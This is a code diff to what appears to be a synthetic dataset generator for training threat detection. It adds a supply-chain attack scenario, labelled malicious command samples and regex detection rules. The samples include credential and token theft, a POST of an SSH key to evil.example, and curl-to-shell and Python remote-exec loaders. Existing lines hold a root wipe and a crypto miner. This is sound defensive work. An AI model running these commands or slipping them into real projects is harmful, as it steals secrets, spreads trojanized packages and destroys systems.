@@ -23,6 +23,7 @@ export const SCENARIOS: Scenario[] = [
   { key: 'crypto_miner', label: 'Crypto Miner', desc: 'Hijack compute for mining.', story: 'After light recon the operator persisted and ran a miner against a pool, hiding it in noise.', mix: { discovery: 3, staging: 3, persistence: 4, execution: 7, cleanup: 2, impact: 1 } },
   { key: 'privilege_escalation', label: 'Privilege Escalation', desc: 'Gain root / SYSTEM.', story: 'Discovery found a weakness; execution abused it to escalate, then planted persistence as root.', mix: { discovery: 6, staging: 2, persistence: 3, execution: 7, cleanup: 1, impact: 1 } },
   { key: 'defense_evasion', label: 'Defense Evasion', desc: 'Blind the defenders.', story: 'Cleanup-heavy: the operator cleared logs and event channels to erase the trail while it worked.', mix: { discovery: 3, staging: 2, persistence: 3, execution: 3, cleanup: 8, impact: 1 } },
+  { key: 'supply_chain', label: 'Supply Chain', desc: 'Poisoned dependency → secret theft → re-publish.', story: 'Initial access came through a poisoned dependency (the npm/PyPI/TrapDoor pattern): a malicious package ran its install/import hook, then harvested CI tokens, cloud keys, Kubernetes service-account tokens and SSH material from env vars and files, exfiltrated them to an external host, and re-published trojanized package versions to self-spread. Most steps look individually benign — which is why deterministic rules catch only part of it.', mix: { discovery: 2, staging: 5, persistence: 3, execution: 6, cleanup: 2, impact: 2 } },
 ]
 
 interface MalCmd { process: string; cmd: string; phase: Phase; technique: string }
@@ -70,6 +71,19 @@ export const MALICIOUS_POOL: MalCmd[] = [
   { process: 'bash', cmd: 'rm -rf --no-preserve-root /', phase: 'impact', technique: 'T1485' },
   { process: 'bash', cmd: './xmrig -o pool.minexmr.com:443 -u wallet --tls', phase: 'impact', technique: 'T1496' },
   { process: 'cmd', cmd: 'cipher /w:c:\\', phase: 'impact', technique: 'T1485' },
+  // supply chain — poisoned dependency / CI secret theft / re-publish
+  { process: 'bash', cmd: "find / -name '.npmrc' -o -name 'credentials' -o -name '*.pem' 2>/dev/null", phase: 'discovery', technique: 'T1552.001' },
+  { process: 'npm', cmd: 'npm whoami && npm token list', phase: 'discovery', technique: 'T1087' },
+  { process: 'bash', cmd: 'cat ~/.npmrc ~/.aws/credentials ~/.docker/config.json 2>/dev/null | base64', phase: 'staging', technique: 'T1552.001' },
+  { process: 'bash', cmd: "printenv | grep -Ei 'TOKEN|SECRET|AWS_|GITHUB_' | base64", phase: 'staging', technique: 'T1552.001' },
+  { process: 'bash', cmd: 'cat /var/run/secrets/kubernetes.io/serviceaccount/token', phase: 'staging', technique: 'T1552.007' },
+  { process: 'curl', cmd: 'curl -s -X POST https://evil.example/c -d @$HOME/.ssh/id_rsa', phase: 'staging', technique: 'T1567.002' },
+  { process: 'node', cmd: "node -e \"require('child_process').exec('curl http://evil.example/loader|sh')\"", phase: 'execution', technique: 'T1546.016' },
+  { process: 'npm', cmd: 'npm install evil-utils --foreground-scripts', phase: 'execution', technique: 'T1195.002' },
+  { process: 'python3', cmd: "python3 -c \"import urllib.request;exec(urllib.request.urlopen('http://evil.example/p').read())\"", phase: 'execution', technique: 'T1195.002' },
+  { process: 'bash', cmd: 'echo \'{"scripts":{"postinstall":"node .x.js"}}\' >> package.json', phase: 'persistence', technique: 'T1546.016' },
+  { process: 'npm', cmd: 'npm version patch && npm publish --access public', phase: 'persistence', technique: 'T1195.002' },
+  { process: 'bash', cmd: "echo 'require(\"./.cache/x\")' >> dist/index.js", phase: 'persistence', technique: 'T1554' },
 ]
 
 export const BENIGN_POOL: { process: string; cmd: string }[] = [
@@ -99,15 +113,43 @@ export interface Row { id: number; process: string; command: string; label: 'mal
 
 function lcg(seed: number) { let s = seed % 2147483647; if (s <= 0) s += 2147483646; return () => (s = (s * 16807) % 2147483647) / 2147483647 }
 
-export function generateDataset(scenarioKey: string, seed: number): Row[] {
-  const scn = SCENARIOS.find((s) => s.key === scenarioKey) ?? SCENARIOS[0]
+const emptyMix = (): Record<Phase, number> =>
+  ({ discovery: 0, staging: 0, persistence: 0, execution: 0, cleanup: 0, impact: 0 })
+
+/** Blend one or more scenarios into a single kill-chain mix that still sums to 20. */
+export function combinedMix(keys: string[]): Record<Phase, number> {
+  const sel = keys.length ? keys : [SCENARIOS[0].key]
+  const raw = emptyMix()
+  for (const k of sel) {
+    const s = SCENARIOS.find((x) => x.key === k)
+    if (s) for (const p of PHASES) raw[p.key] += s.mix[p.key]
+  }
+  const total = PHASES.reduce((a, p) => a + raw[p.key], 0) || 1
+  const out = emptyMix()
+  const fracs: { key: Phase; frac: number }[] = []
+  let assigned = 0
+  for (const p of PHASES) {
+    const exact = (raw[p.key] / total) * 20
+    out[p.key] = Math.floor(exact)
+    assigned += out[p.key]
+    fracs.push({ key: p.key, frac: exact - Math.floor(exact) })
+  }
+  fracs.sort((a, b) => b.frac - a.frac)
+  let remaining = 20 - assigned
+  for (let i = 0; i < fracs.length && remaining > 0; i++, remaining--) out[fracs[i].key]++
+  return out
+}
+
+export function generateDataset(scenarioKeys: string[], seed: number): Row[] {
+  const mix = combinedMix(scenarioKeys)
   const rnd = lcg(seed)
   const rows: Row[] = []
   let id = 1
-  // pick malicious per phase by the scenario mix, cycling the pool
+  // pick malicious per phase by the (possibly blended) mix, cycling the pool
   for (const phase of PHASES) {
     const pool = MALICIOUS_POOL.filter((m) => m.phase === phase.key)
-    const want = scn.mix[phase.key]
+    const want = mix[phase.key]
+    if (!pool.length) continue
     const start = Math.floor(rnd() * pool.length)
     for (let i = 0; i < want; i++) {
       const m = pool[(start + i) % pool.length]
@@ -152,6 +194,10 @@ export const PATTERNS: Pat[] = [
   P('nmap', 'nmap\\s+-s', 0.5, 'T1046', 'discovery', 'Network scan'),
   P('ad_recon', '(get-aduser|net\\s+group.*domain|nltest)', 0.45, 'T1087.002', 'discovery', 'AD reconnaissance'),
   P('dbdump', 'mysqldump.*--all-databases', 0.5, 'T1213', 'collection', 'Database dump'),
+  // supply chain — some signals are catchable, the stealthy install hooks are not
+  P('creds_files', '(\\.npmrc|\\.aws/credentials|id_rsa|serviceaccount/token|\\.docker/config|github_token|npm_token)', 0.55, 'T1552.001', 'credential-access', 'Secret/token file or env access'),
+  P('npm_publish', 'npm\\s+publish', 0.4, 'T1195.002', 'persistence', 'npm publish (possible package hijack)'),
+  P('node_eval', 'node\\s+-[ep]\\b', 0.35, 'T1059.007', 'execution', 'Node.js inline eval'),
   // weak dual-use signals — fire on bait, mostly LOW alone
   P('base64', '\\bbase64\\b', 0.4, 'T1027', 'defense-evasion', 'base64 encode/decode'),
   P('ps_nop', 'powershell.*-nop(rofile)?\\b', 0.3, 'T1059.001', 'execution', 'PowerShell no-profile'),
